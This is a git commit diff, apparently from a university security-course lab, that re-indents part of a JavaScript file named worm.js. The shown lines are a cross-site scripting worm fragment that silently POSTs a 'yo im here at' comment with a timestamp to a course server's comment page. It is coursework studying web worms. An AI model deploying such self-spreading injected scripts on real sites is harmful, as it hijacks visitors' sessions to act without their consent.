ff63c9cb15d82b9c14c9cccbba2e3a1d82695607
pmm4516 <47233086+pmm4516@users.noreply.github.com>
2021-04-12 21:21:10 -0400

    Add files via upload

--- worm.js
+++ worm.js
@@ -5,9 +5,9 @@
     xml.send();
 
     var report = new XMLHttpRequest();
-	var date = new Date();
-	var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=134%26comment%3Dyo im here at '%2B date;
-	report.open("POST", url, true);
-	report.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	report.send();
+    var date = new Date();
+    var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=134%26comment%3Dyo im here at '%2B date;
+    report.open("POST", url, true);
+    report.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    report.send();
 </script>
